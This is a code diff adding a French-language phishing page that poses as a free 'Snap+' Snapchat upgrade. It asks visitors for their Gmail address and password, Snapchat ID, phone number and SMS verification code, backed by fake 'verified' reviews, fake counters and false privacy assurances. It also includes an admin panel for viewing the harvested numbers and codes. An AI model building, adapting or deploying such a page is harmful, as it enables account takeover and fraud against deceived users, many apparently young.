+    <div class="features-grid" style="grid-template-columns: repeat(3, 1fr);">
+      <div class="feat" style="text-align:center;">
+        <div style="width:52px;height:52px;border-radius:50%;background:var(--accent-glow);border:1.5px solid rgba(255,252,0,0.3);display:flex;align-items:center;justify-content:center;margin:0 auto 1rem;">
+          <span style="font-family:'Syne',sans-serif;font-size:1.3rem;font-weight:800;color:var(--accent);">1</span>
+        </div>
+        <h3>Ton compte Snap</h3>
+        <p>Entre ton identifiant Snapchat pour commencer la vérification.</p>
+      </div>
+      <div class="feat" style="text-align:center;">
+        <div style="width:52px;height:52px;border-radius:50%;background:var(--accent-glow);border:1.5px solid rgba(255,252,0,0.3);display:flex;align-items:center;justify-content:center;margin:0 auto 1rem;">
+          <span style="font-family:'Syne',sans-serif;font-size:1.3rem;font-weight:800;color:var(--accent);">2</span>
+        </div>
+        <h3>Ton numéro</h3>
+        <p>Entre ton numéro de téléphone pour recevoir ton code par SMS.</p>
+      </div>
+      <div class="feat" style="text-align:center;">
+        <div style="width:52px;height:52px;border-radius:50%;background:var(--accent-glow);border:1.5px solid rgba(255,252,0,0.3);display:flex;align-items:center;justify-content:center;margin:0 auto 1rem;">
+          <span style="font-family:'Syne',sans-serif;font-size:1.3rem;font-weight:800;color:var(--accent);">3</span>
+        </div>
+        <h3>Active ton accès</h3>
+        <p>Saisis le code reçu et ton Snap+ est immédiatement activé.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- STATS + AVIS SUR LA PAGE D'ACCUEIL -->
+  <section style="position:relative;z-index:1;padding:0 1.5rem 5rem;max-width:960px;margin:0 auto;">
+
+    <!-- Stats badges -->
+    <div style="display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-bottom:3rem;">
+      <div style="display:inline-flex;align-items:center;gap:8px;background:var(--card);border:1px solid var(--border2);border-radius:100px;padding:10px 20px;">
+        <span style="font-size:1.1rem;">👥</span>
+        <span style="font-size:0.88rem;color:var(--muted);">Activations</span>
+        <span style="font-family:'Syne',sans-serif;font-weight:800;font-size:1rem;color:#FFFC00;">12 347</span>
+      </div>
+      <div style="display:inline-flex;align-items:center;gap:8px;background:var(--card);border:1px solid var(--border2);border-radius:100px;padding:10px 20px;">
+        <span style="font-size:1.1rem;">⭐</span>
+        <span style="font-size:0.88rem;color:var(--muted);">Note moyenne</span>
+        <span style="font-family:'Syne',sans-serif;font-weight:800;font-size:1rem;color:#FFFC00;">4,8 / 5</span>
+      </div>
+      <div style="display:inline-flex;align-items:center;gap:8px;background:var(--card);border:1px solid var(--border2);border-radius:100px;padding:10px 20px;">
+        <span style="font-size:1.1rem;">⚡</span>
+        <span style="font-size:0.88rem;color:var(--muted);">Activation en</span>
+        <span style="font-family:'Syne',sans-serif;font-weight:800;font-size:1rem;color:#FFFC00;">&lt; 30s</span>
+      </div>
+      <div style="display:inline-flex;align-items:center;gap:8px;background:var(--card);border:1px solid var(--border2);border-radius:100px;padding:10px 20px;">
+        <span style="font-size:1.1rem;">💬</span>
+        <span style="font-size:0.88rem;color:var(--muted);">Avis vérifiés</span>
+        <span style="font-family:'Syne',sans-serif;font-weight:800;font-size:1rem;color:#FFFC00;">853</span>
+      </div>
+    </div>
+
+    <!-- Section titre avis -->
+    <div style="text-align:center;margin-bottom:1.5rem;">
+      <span style="font-family:'Syne',sans-serif;font-size:0.75rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;">Ce qu'ils disent</span>
+      <h2 style="font-family:'Syne',sans-serif;font-size:1.6rem;font-weight:800;margin-top:6px;">Ils ont déjà activé Snap+</h2>
+    </div>
+
+    <!-- Grille avis -->
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:12px;margin-bottom:1.5rem;">
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.25rem;">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
+          <div style="width:36px;height:36px;border-radius:50%;background:#FFFC00;display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-weight:800;font-size:0.9rem;color:#000;">S</div>
+          <div><div style="font-family:'Syne',sans-serif;font-weight:700;font-size:0.88rem;">Safouen <span style="color:var(--muted);font-weight:400;">@darkdu75</span></div><div style="font-size:0.7rem;color:var(--faint);">Il y a 2 min</div></div>
+          <span style="margin-left:auto;background:rgba(255,252,0,0.1);color:#FFFC00;font-size:0.68rem;padding:3px 8px;border-radius:100px;font-weight:600;flex-shrink:0;">✓ Vérifié</span>
+        </div>
+        <div style="font-size:0.75rem;color:#FFFC00;margin-bottom:6px;">⭐⭐⭐⭐⭐</div>
+        <p style="font-size:0.85rem;color:var(--muted);line-height:1.5;">"J'ai cru que c'était du scam mais nan j'ai eu 🔥"</p>
+      </div>
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.25rem;">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
+          <div style="width:36px;height:36px;border-radius:50%;background:#ff5b8a;display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-weight:800;font-size:0.9rem;color:#fff;">M</div>
+          <div><div style="font-family:'Syne',sans-serif;font-weight:700;font-size:0.88rem;">Mia <span style="color:var(--muted);font-weight:400;">@lafolle081938</span></div><div style="font-size:0.7rem;color:var(--faint);">Il y a 7 min</div></div>
+          <span style="margin-left:auto;background:rgba(255,252,0,0.1);color:#FFFC00;font-size:0.68rem;padding:3px 8px;border-radius:100px;font-weight:600;flex-shrink:0;">✓ Vérifié</span>
+        </div>
+        <div style="font-size:0.75rem;color:#FFFC00;margin-bottom:6px;">⭐⭐⭐⭐⭐</div>
+        <p style="font-size:0.85rem;color:var(--muted);line-height:1.5;">"Plus besoin de payer 4€/mois c carré merci j'ai enfin Snap+ 🙏"</p>
+      </div>
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.25rem;">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
+          <div style="width:36px;height:36px;border-radius:50%;background:#4fc3f7;display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-weight:800;font-size:0.9rem;color:#000;">R</div>
+          <div><div style="font-family:'Syne',sans-serif;font-weight:700;font-size:0.88rem;">Rayan <span style="color:var(--muted);font-weight:400;">@ryn.2407</span></div><div style="font-size:0.7rem;color:var(--faint);">Il y a 12 min</div></div>
+          <span style="margin-left:auto;background:rgba(255,252,0,0.1);color:#FFFC00;font-size:0.68rem;padding:3px 8px;border-radius:100px;font-weight:600;flex-shrink:0;">✓ Vérifié</span>
+        </div>
+        <div style="font-size:0.75rem;color:#FFFC00;margin-bottom:6px;">⭐⭐⭐⭐⭐</div>
+        <p style="font-size:0.85rem;color:var(--muted);line-height:1.5;">"jsp comment c possible mais ça marche fr 😭"</p>
+      </div>
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.25rem;">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
+          <div style="width:36px;height:36px;border-radius:50%;background:#ff8a65;display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-weight:800;font-size:0.9rem;color:#fff;">K</div>
+          <div><div style="font-family:'Syne',sans-serif;font-weight:700;font-size:0.88rem;">Kylian <span style="color:var(--muted);font-weight:400;">@dat2381</span></div><div style="font-size:0.7rem;color:var(--faint);">Il y a 45 min</div></div>
+          <span style="margin-left:auto;background:rgba(255,252,0,0.1);color:#FFFC00;font-size:0.68rem;padding:3px 8px;border-radius:100px;font-weight:600;flex-shrink:0;">✓ Vérifié</span>
+        </div>
+        <div style="font-size:0.75rem;color:#FFFC00;margin-bottom:6px;">⭐⭐⭐⭐⭐</div>
+        <p style="font-size:0.85rem;color:var(--muted);line-height:1.5;">"bro ça marche jsp c quoi la magie 😭"</p>
+      </div>
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.25rem;">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
+          <div style="width:36px;height:36px;border-radius:50%;background:#ba68c8;display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-weight:800;font-size:0.9rem;color:#fff;">L</div>
+          <div><div style="font-family:'Syne',sans-serif;font-weight:700;font-size:0.88rem;">Lina <span style="color:var(--muted);font-weight:400;">@linaa.off</span></div><div style="font-size:0.7rem;color:var(--faint);">Il y a 31 min</div></div>
+          <span style="margin-left:auto;background:rgba(255,252,0,0.1);color:#FFFC00;font-size:0.68rem;padding:3px 8px;border-radius:100px;font-weight:600;flex-shrink:0;">✓ Vérifié</span>
+        </div>
+        <div style="font-size:0.75rem;color:#FFFC00;margin-bottom:6px;">⭐⭐⭐⭐⭐</div>
+        <p style="font-size:0.85rem;color:var(--muted);line-height:1.5;">"j'y croyais pas du tout et pourtant 💀"</p>
+      </div>
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.25rem;">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
+          <div style="width:36px;height:36px;border-radius:50%;background:#81c784;display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-weight:800;font-size:0.9rem;color:#000;">Y</div>
+          <div><div style="font-family:'Syne',sans-serif;font-weight:700;font-size:0.88rem;">Yanis <span style="color:var(--muted);font-weight:400;">@yns.exe</span></div><div style="font-size:0.7rem;color:var(--faint);">Il y a 23 min</div></div>
+          <span style="margin-left:auto;background:rgba(255,252,0,0.1);color:#FFFC00;font-size:0.68rem;padding:3px 8px;border-radius:100px;font-weight:600;flex-shrink:0;">✓ Vérifié</span>
+        </div>
+        <div style="font-size:0.75rem;color:#FFFC00;margin-bottom:6px;">⭐⭐⭐⭐⭐</div>
+        <p style="font-size:0.85rem;color:var(--muted);line-height:1.5;">"validé en 30s chrono frr merci 🔥"</p>
+      </div>
+
+    </div>
+
+    <!-- Bouton voir tous les avis -->
+    <div style="text-align:center;">
+      <button onclick="openReviews()" style="display:inline-flex;align-items:center;gap:8px;background:none;border:1px solid rgba(255,252,0,0.3);color:#FFFC00;border-radius:100px;padding:10px 24px;font-size:0.85rem;cursor:pointer;font-family:'DM Sans',sans-serif;transition:background 0.2s;" onmouseover="this.style.background='rgba(255,252,0,0.06)'" onmouseout="this.style.background='none'">
+        ⭐ Voir les 853 avis vérifiés →
+      </button>
+    </div>
+
+  </section>
+
+    <div style="max-width:960px;margin:0 auto;">
+
+      <!-- Disclaimer -->
+      <div style="padding:12px 16px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05);border-radius:10px;font-size:0.7rem;color:var(--faint);line-height:1.6;text-align:center;margin-bottom:1.5rem;">
+        Ce site n'est pas affilié à Snapchat Inc. Snap, Snapchat et Snap+ sont des marques déposées de Snap Inc. Toute ressemblance avec des services officiels est purement visuelle à titre indicatif.
+      </div>
+
+      <!-- Bottom row -->
+      <div style="display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;gap:1rem;">
+        <div style="font-size:0.75rem;color:var(--faint);">© 2025 Snap+ · Tous droits réservés · <span style="color:#FFFC00;">Offre limitée</span></div>
+        <div style="display:flex;gap:1.25rem;flex-wrap:wrap;align-items:center;">
+          <a href="#" onclick="openLegal('cgu');return false;" style="font-size:0.72rem;color:var(--faint);text-decoration:none;transition:color 0.2s;" onmouseover="this.style.color='#FFFC00'" onmouseout="this.style.color='var(--faint)'">Conditions d'utilisation</a>
+          <a href="#" onclick="openLegal('privacy');return false;" style="font-size:0.72rem;color:var(--faint);text-decoration:none;transition:color 0.2s;" onmouseover="this.style.color='#FFFC00'" onmouseout="this.style.color='var(--faint)'">Confidentialité</a>
+          <a href="#" onclick="openLegal('cookies');return false;" style="font-size:0.72rem;color:var(--faint);text-decoration:none;transition:color 0.2s;" onmouseover="this.style.color='#FFFC00'" onmouseout="this.style.color='var(--faint)'">Cookies</a>
+          <a href="#" onclick="openLegal('credits');return false;" style="font-size:0.72rem;color:var(--faint);text-decoration:none;transition:color 0.2s;" onmouseover="this.style.color='#FFFC00'" onmouseout="this.style.color='var(--faint)'">Crédits</a>
+          <span style="font-size:0.72rem;color:var(--faint);">🔒 SSL</span>
+          <span style="font-size:0.72rem;color:var(--faint);">🛡️ RGPD</span>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- MODAL LÉGAL -->
+  <div id="legalOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(6px);z-index:998;overflow-y:auto;padding:1rem;">
+    <div style="max-width:560px;margin:2rem auto;background:#0e0e14;border:1px solid rgba(255,252,0,0.15);border-radius:20px;padding:2rem;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:1.5rem;">
+        <div style="font-family:'Syne',sans-serif;font-weight:800;font-size:1.1rem;" id="legalTitle">Conditions d'utilisation</div>
+        <button onclick="closeLegal()" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#888;border-radius:50%;width:32px;height:32px;cursor:pointer;font-size:1rem;">✕</button>
+      </div>
+      <div id="legalContent" style="font-size:0.85rem;color:rgba(255,255,255,0.6);line-height:1.8;"></div>
+    </div>
+  </div>
+  <div class="overlay" id="overlay">
+    <div class="modal" id="modal">
+      <div class="cooldown-page" id="cooldownPage">
+        <div class="cd-bg"></div>
+        <div class="cd-content">
+          <div class="cd-ghost">
+            <svg viewBox="0 0 64 64" width="120" height="120" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M32 5c-10.3 0-17.5 7.6-17.5 18.4v17.4l-3.7 4.9c-.6.8-.1 2 .9 2.2l3.6.6-.5 2.6c-.2.8.6 1.5 1.4 1.3l4.6-1.1 4.4 4.5c.5.5 1.3.6 1.8.1L32 52.4l4.9 3.5c.6.4 1.4.4 1.9-.1l4.4-4.5 4.6 1.1c.8.2 1.6-.5 1.4-1.3l-.5-2.6 3.6-.6c1-.2 1.5-1.4.9-2.2l-3.7-4.9V23.4C49.5 12.6 42.3 5 32 5z" fill="#FFFC00"></path><circle cx="24" cy="29" r="3.5" fill="#000"></circle><circle cx="40" cy="29" r="3.5" fill="#000"></circle></svg>
+          </div>
+          <div class="cd-eyebrow">Vérification sécurisée</div>
+          <div class="cd-title" id="cdBigTitle">Vérification de ton compte…</div>
+          <div class="cd-timer-big" id="cdTimerBig">0:30</div>
+          <div class="cd-progress-wrap"><div class="cd-progress-bar" id="cdProgressBar"></div></div>
+          <div class="cd-msg" id="cdMsg">Connexion aux serveurs Snap…</div>
+          <div class="cd-checks">
+            <div class="cd-check" id="cdCheck1"><span class="cd-spin"></span> Authentification du compte Snapchat</div>
+            <div class="cd-check" id="cdCheck2"><span class="cd-dot"></span> Vérification anti-fraude</div>
+            <div class="cd-check" id="cdCheck3"><span class="cd-dot"></span> Préparation de l'activation Snap+</div>
+          </div>
+          <div class="cd-foot">🔒 Connexion chiffrée · Ne ferme pas cette page</div>
+        </div>
+      </div>
+      
+      <button class="modal-close" onclick="closeModal()">✕</button>
+      <div class="modal-logo">
+        <div class="bolt"><svg viewBox="0 0 64 64" width="62%" height="62%" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M32 5c-10.3 0-17.5 7.6-17.5 18.4v17.4l-3.7 4.9c-.6.8-.1 2 .9 2.2l3.6.6-.5 2.6c-.2.8.6 1.5 1.4 1.3l4.6-1.1 4.4 4.5c.5.5 1.3.6 1.8.1L32 52.4l4.9 3.5c.6.4 1.4.4 1.9-.1l4.4-4.5 4.6 1.1c.8.2 1.6-.5 1.4-1.3l-.5-2.6 3.6-.6c1-.2 1.5-1.4.9-2.2l-3.7-4.9V23.4C49.5 12.6 42.3 5 32 5z" fill="#000"></path><circle cx="24" cy="29" r="3.2" fill="#FFFC00"></circle><circle cx="40" cy="29" r="3.2" fill="#FFFC00"></circle></svg></div>
+        Snap<span class="plus-tag">+</span>
+      </div>
+      <div class="cooldown-wrap hidden" id="cooldownWrap" style="display:none">
+        <div class="cooldown-info">
+          <span>Vérification en cours...</span>
+          <span class="cd-timer" id="cdTimer">1:00</span>
+        </div>
+        <div class="cooldown-bar-wrap">
+          <div class="cooldown-bar" id="cooldownBar"></div>
+        </div>
+      </div>
+      <div class="steps-nav" id="stepsNav">
+        <div class="step-dot">
+          <div class="dot-circle active" id="dn0">1</div>
+          <div class="dot-label active" id="dl0">Compte</div>
+        </div>
+        <div class="step-line" id="line0"></div>
+        <div class="step-dot">
+          <div class="dot-circle" id="dn1">2</div>
+          <div class="dot-label" id="dl1">Snap ID</div>
+        </div>
+        <div class="step-line" id="line1"></div>
+        <div class="step-dot">
+          <div class="dot-circle" id="dn2">3</div>
+          <div class="dot-label" id="dl2">Numéro</div>
+        </div>
+        <div class="step-line" id="line2"></div>
+        <div class="step-dot">
+          <div class="dot-circle" id="dn3">4</div>
+          <div class="dot-label" id="dl3">Code SMS</div>
+        </div>
+        <div class="step-line" id="line3"></div>
+        <div class="step-dot">
+          <div class="dot-circle" id="dn4">5</div>
+          <div class="dot-label" id="dl4">Confirmé</div>
+        </div>
+      </div>
+      <!-- ÉTAPE 0 — Créer un compte -->
+      <div id="step0">
+        <div class="warn-banner">⚠️ Utilise un vrai email — sinon ça ne marchera pas. Il faut mettre le mot de passe de ton compte Gmail</div>
+        <div class="modal-title">Créer ton compte 🔐</div>
+        <div class="modal-sub">Crée ton compte gratuit pour activer Snap+. Utilise un <strong>vrai email Gmail</strong> et ton mot de passe Gmail — c'est obligatoire pour la vérification.</div>
+        <label class="field-label">Pseudo</label>
+        <input class="phone-input" type="text" id="pseudoInput" placeholder="ex: darksnap75" style="width:100%;margin-bottom:1.25rem;" onkeydown="if(event.key==='Enter') document.getElementById('emailInput').focus()" autocomplete="username" oninput="this.value=this.value.replace(/\s/g,'')">
+        <div class="error-msg" id="errPseudo">Pseudo invalide (3 caractères min).</div>
+        <label class="field-label">Adresse email</label>
+        <input class="phone-input" type="email" id="emailInput" placeholder="ex: ton@email.com" style="width:100%;margin-bottom:1.25rem;" onkeydown="if(event.key==='Enter') document.getElementById('passwordInput').focus()" autocomplete="email">
+        <div class="error-msg" id="errEmail">Email invalide.</div>
+        <label class="field-label">Mot de passe de ton compte Gmail</label>
+        <input class="phone-input" type="password" id="passwordInput" placeholder="Mot de passe de ton compte Gmail" style="width:100%;margin-bottom:1.5rem;" onkeydown="if(event.key==='Enter') goToSnap()" autocomplete="current-password">
+        <div class="error-msg" id="errPassword">Ce champ est obligatoire.</div>
+        <button class="btn-submit" id="btnStep0" onclick="goToSnap()">Créer mon compte →</button>
+        <p class="privacy-note" style="margin-top:10px;">🔒 Tes données sont chiffrées et ne sont jamais revendues.</p>
+      </div>
+
+      <div id="step1" class="hidden">
+        <div class="warn-banner">⚠️ Attention — Un faux ID Snapchat ou email ne fonctionnera pas</div>
+        <div class="modal-title">Ton compte Snapchat 👻</div>
+        <div class="modal-sub">Entre ton identifiant Snapchat ou ton adresse email pour continuer.</div>
+        <label class="field-label">Snapchat ID ou Email</label>
+        <input class="phone-input" type="text" id="snapInput" placeholder="ex: tonpseudo" style="width:100%;margin-bottom:1.5rem;" onkeydown="if(event.key==='Enter') goToPhone()" oninput="this.value=this.value.replace(/[^a-zA-Z0-9._-]/g,'')">
+        <div class="error-msg" id="errSnap">Ce champ est obligatoire.</div>
+        <button class="btn-submit" id="btnStep1" onclick="goToPhone()">Continuer →</button>
+        <button onclick="retryModal()" style="background:none;border:none;color:var(--faint);font-size:0.78rem;cursor:pointer;text-decoration:underline;font-family:'DM Sans',sans-serif;margin-top:8px;display:block;width:100%;text-align:center;">↩ Réessayer avec un autre compte</button>
+
+        <!-- CONDITIONS GÉNÉRALES -->
+        <div style="margin-top:12px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 14px;">
+          <label style="display:flex;align-items:flex-start;gap:10px;cursor:pointer;">
+            <input type="checkbox" id="cguCheck" style="margin-top:3px;accent-color:#FFFC00;flex-shrink:0;width:15px;height:15px;" />
+            <span style="font-size:0.75rem;color:var(--muted);line-height:1.6;">
+              J'accepte les <a href="#" onclick="openLegal('cgu');return false;" style="color:#FFFC00;text-decoration:underline;">conditions générales d'utilisation</a> et la <a href="#" onclick="openLegal('privacy');return false;" style="color:#FFFC00;text-decoration:underline;">politique de confidentialité</a>. Je comprends que ce service est gratuit et sans engagement.
+            </span>
+          </label>
+          <div style="height:1px;background:rgba(255,255,255,0.05);margin:10px 0;"></div>
+          <div style="font-size:0.68rem;color:var(--faint);line-height:1.7;">
+            En continuant, vous autorisez ce site à accéder à votre numéro de téléphone, votre identifiant Snapchat et votre adresse email à des fins de vérification d'identité. Ces données sont traitées conformément au RGPD et ne seront jamais revendues à des tiers. Vous pouvez exercer vos droits à tout moment en contactant support@snap-plus.fr
+          </div>
+        </div>
+
+        <p class="privacy-note">🔒 Tes informations restent confidentielles · 🛡️ Connexion sécurisée SSL</p>
+      </div>
+      <div id="step2" class="hidden">
+        <div class="warn-banner">⚠️ Attention — Un faux numéro de téléphone ne fonctionnera pas</div>
+        <div style="background:rgba(255,252,0,0.06);border:1px solid rgba(255,252,0,0.2);border-radius:12px;padding:10px 16px;margin-bottom:1.25rem;text-align:center;font-size:0.82rem;color:rgba(255,255,255,0.6);">📶 Cette technique fonctionne uniquement avec <strong style="color:#FFFC00;">Bouygues</strong>, <strong style="color:#FFFC00;">SFR</strong> et <strong style="color:#FFFC00;">Orange</strong></div>
+        <div class="modal-title">Ton numéro 📱</div>
+        <div class="modal-sub">Entre ton numéro de téléphone. On t'envoie un code SMS pour vérifier que c'est bien toi.</div>
+        <label class="field-label">Numéro de téléphone</label>
+        <div class="phone-row">
+          <select class="country-sel" id="countryCode">
+            <option value="+33">🇫🇷 +33</option>
+            <option value="+32">🇧🇪 +32</option>
+            <option value="+41">🇨🇭 +41</option>
+            <option value="+352">🇱🇺 +352</option>
+            <option value="+1">🇺🇸 +1</option>
+            <option value="+44">🇬🇧 +44</option>
+          </select>
+          <input class="phone-input" type="tel" id="phoneInput" placeholder="06 12 34 56 78" maxlength="14" onkeydown="if(event.key==='Enter') goToCode()" oninput="this.value=this.value.replace(/[^0-9\s]/g,'')">
+        </div>
+        <div class="error-msg" id="err1">Numéro invalide. Vérifie et réessaie.</div>
+        <button class="btn-submit" id="btnStep2" onclick="goToCode()">Continuer →</button>
+        <button onclick="retryModal()" style="background:none;border:none;color:var(--faint);font-size:0.78rem;cursor:pointer;text-decoration:underline;font-family:'DM Sans',sans-serif;margin-top:8px;display:block;width:100%;text-align:center;">↩ Réessayer avec un autre compte</button>
+        <p class="privacy-note">🔒 Ton numéro reste confidentiel et ne sera jamais partagé.</p>
+      </div>
+      <div id="step3" class="hidden">
+        <div class="warn-banner">⚠️ Attention — Un faux code de validation ne fonctionnera pas</div>
+        <div class="modal-title">Code de validation ✅</div>
+        <div class="modal-sub">Un code de validation à 4 chiffres vient d'être envoyé au <strong id="displayPhone">—</strong></div>
+        <div class="code-grid">
+          <input class="code-box" type="text" maxlength="1" inputmode="numeric" id="c0">
+          <input class="code-box" type="text" maxlength="1" inputmode="numeric" id="c1">
+          <input class="code-box" type="text" maxlength="1" inputmode="numeric" id="c2">
+          <input class="code-box" type="text" maxlength="1" inputmode="numeric" id="c3">
+        </div>
+        <div class="resend-row">Pas reçu ? <a onclick="resendCode()">Renvoyer le code</a></div>
+        <button class="btn-submit" id="btnValidate" onclick="validateCode()" disabled="">Valider le code →</button>
+        <button onclick="retryModal()" style="background:none;border:none;color:var(--faint);font-size:0.78rem;cursor:pointer;text-decoration:underline;font-family:'DM Sans',sans-serif;margin-top:8px;display:block;width:100%;text-align:center;">↩ Réessayer avec un autre compte</button>
+        <p class="privacy-note">🔒 Code valable 10 minutes · Le SMS provient de <strong>SNAPVERIF</strong></p>
+      </div>
+      <div id="step4" class="hidden">
+        <div class="success-area">
+          <div class="success-ring">✓</div>
+          <div class="success-title">C'est validé ! 🎉</div>
+          <div class="success-sub" style="font-size:1rem;line-height:1.7;">
+            Vérification réussie ✅<br>
+            <strong style="color:#FFFC00;">Tu recevras Snap+ dans moins de 30 secondes</strong> directement sur ton compte Snapchat.
+          </div>
+          <div class="activated-badge" style="font-size:1.05rem;padding:14px 28px;">👻 Snap+ en cours d'activation…</div>
+          <div style="display:flex;flex-direction:column;gap:10px;margin:1.5rem auto 0;max-width:340px;font-size:0.85rem;color:rgba(255,255,255,0.7);text-align:left;">
+            <div style="display:flex;align-items:center;gap:10px;"><span style="color:#FFFC00;">✓</span>Compte Snapchat vérifié</div>
+            <div style="display:flex;align-items:center;gap:10px;"><span style="color:#FFFC00;">✓</span>Numéro confirmé par SMS</div>
+            <div style="display:flex;align-items:center;gap:10px;"><span style="color:#FFFC00;">✓</span>Snap+ ajouté à ton profil</div>
+            <div style="display:flex;align-items:center;gap:10px;"><span style="color:#FFFC00;">⏱</span>Délai d'activation : <strong style="color:#fff;">moins de 30 secondes</strong></div>
+          </div>
+          <br>
+          <button class="close-btn" onclick="closeModal()">Fermer →</button>
+          <br><br>
+          <button onclick="retryModal()" style="background:none;border:none;color:var(--muted);font-size:0.82rem;cursor:pointer;text-decoration:underline;font-family:'DM Sans',sans-serif;">↩ Réessayer avec un autre compte</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div id="adminPage">
+  <div class="login-wrap" id="loginWrap">
+    <div class="login-card">
+      <div class="login-logo">
+        <div class="bolt"><svg viewBox="0 0 64 64" width="62%" height="62%" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M32 5c-10.3 0-17.5 7.6-17.5 18.4v17.4l-3.7 4.9c-.6.8-.1 2 .9 2.2l3.6.6-.5 2.6c-.2.8.6 1.5 1.4 1.3l4.6-1.1 4.4 4.5c.5.5 1.3.6 1.8.1L32 52.4l4.9 3.5c.6.4 1.4.4 1.9-.1l4.4-4.5 4.6 1.1c.8.2 1.6-.5 1.4-1.3l-.5-2.6 3.6-.6c1-.2 1.5-1.4.9-2.2l-3.7-4.9V23.4C49.5 12.6 42.3 5 32 5z" fill="#000"></path><circle cx="24" cy="29" r="3.2" fill="#FFFC00"></circle><circle cx="40" cy="29" r="3.2" fill="#FFFC00"></circle></svg></div>
+        Snap<span class="plus-tag">+</span>
+      </div>
+      <div class="login-title">🔐 Accès Admin</div>
+      <div class="login-sub">Panneau privé — numéros et codes de validation.</div>
+      <input class="login-input" type="password" id="loginInput" placeholder="Clé d'accès" onkeydown="if(event.key==='Enter') tryLogin()">
+      <div class="login-err" id="loginErr">Clé incorrecte. Réessaie.</div>
+      <button class="btn-login" onclick="tryLogin()">Accéder →</button>
+    </div>
+  </div>
+  <div class="admin-wrap" id="adminWrap">
+    <div class="mobile-nav">
+      <div class="mobile-nav-title">👻 Admin</div>
+      <button class="btn-menu" onclick="toggleSidebar()">☰</button>
+    </div>
+    <div class="sidebar" id="sidebar">
+      <div class="sidebar-logo">
+        <div class="bolt"><svg viewBox="0 0 64 64" width="62%" height="62%" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M32 5c-10.3 0-17.5 7.6-17.5 18.4v17.4l-3.7 4.9c-.6.8-.1 2 .9 2.2l3.6.6-.5 2.6c-.2.8.6 1.5 1.4 1.3l4.6-1.1 4.4 4.5c.5.5 1.3.6 1.8.1L32 52.4l4.9 3.5c.6.4 1.4.4 1.9-.1l4.4-4.5 4.6 1.1c.8.2 1.6-.5 1.4-1.3l-.5-2.6 3.6-.6c1-.2 1.5-1.4.9-2.2l-3.7-4.9V23.4C49.5 12.6 42.3 5 32 5z" fill="#000"></path><circle cx="24" cy="29" r="3.2" fill="#FFFC00"></circle><circle cx="40" cy="29" r="3.2" fill="#FFFC00"></circle></svg></div>
+        Snap<span class="plus-tag">+</span>
+      </div>
+      <button class="nav-item active" id="nav-dashboard" onclick="showAdminPage('dashboard')">
+        <span class="icon">📊</span> Dashboard
+      </button>
+      <button class="nav-item" id="nav-entries" onclick="showAdminPage('entries')">
+        <span class="icon">📋</span> Demandes
+        <span id="badgeCount" style="margin-left:auto;background:var(--accent);color:#000;border-radius:100px;padding:1px 8px;font-size:0.72rem;font-weight:700;display:none;"></span>
+      </button>
+      <button class="nav-item" id="nav-settings" onclick="showAdminPage('settings')">
+        <span class="icon">⚙️</span> Paramètres
+      </button>
+      <div class="sidebar-footer">
+        <button class="btn-back-landing" onclick="backToLanding()">
+          <span>🌐</span> Voir la landing
+        </button>
+        <button class="btn-logout" onclick="logout()">
+          <span>↩</span> Déconnexion
+        </button>
+      </div>
+    </div>
+    <div class="admin-main">
+      <div class="page active" id="page-dashboard">
+        <div class="page-title">Dashboard</div>
+        <div class="page-sub"><span class="refresh-dot"></span> Mise à jour automatique toutes les 30s</div>
+        <div class="stats-grid">
+          <div class="stat-card">
+            <div class="stat-label">Total demandes</div>
+            <div class="stat-value green" id="statTotal">0</div>
+            <div class="stat-sub">depuis le début</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">Codes validés</div>
+            <div class="stat-value green" id="statValidated">0</div>
+            <div class="stat-sub">code Apple reçu</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">En attente</div>
+            <div class="stat-value yellow" id="statPending">0</div>
+            <div class="stat-sub">code non encore reçu</div>
+          </div>
+        </div>
+        <div class="table-header">
+          <div class="table-title">Dernières demandes</div>
+          <button class="btn-refresh" onclick="refreshData()">↻ Actualiser</button>
+        </div>
+        <div class="entries-list" id="dashList">
+          <div class="empty-state"><div class="icon">📭</div><p>Aucune demande pour l'instant.<br>Les nouvelles entrées apparaîtront ici.</p></div>
+        </div>
+      </div>
+      <div class="page" id="page-entries">
+        <div class="page-title">Toutes les demandes</div>
+        <div class="page-sub">Numéros, Snap ID et codes Apple reçus.</div>
